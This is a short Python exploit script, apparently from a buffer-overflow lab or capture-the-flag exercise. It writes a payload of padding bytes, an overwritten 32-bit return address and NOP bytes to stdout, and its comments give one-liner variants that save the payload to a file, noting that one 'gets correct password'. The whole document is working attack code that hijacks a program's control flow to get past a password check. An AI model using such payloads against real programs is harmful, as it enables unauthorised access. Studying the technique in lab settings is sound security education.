#!/usr/bin/env python3

import sys

payload = b"A" * 20 + b"\x96\x91\x04\x08" + b"\x90" * 4

# Write the raw bytes to stdout
sys.stdout.buffer.write(payload)

#This get's corret password
#python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x96\x91\x04\x08")' > attack_string.txt
#python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x96\x91\x04\x08" + b"\x90" * 4)' > attack_string.txt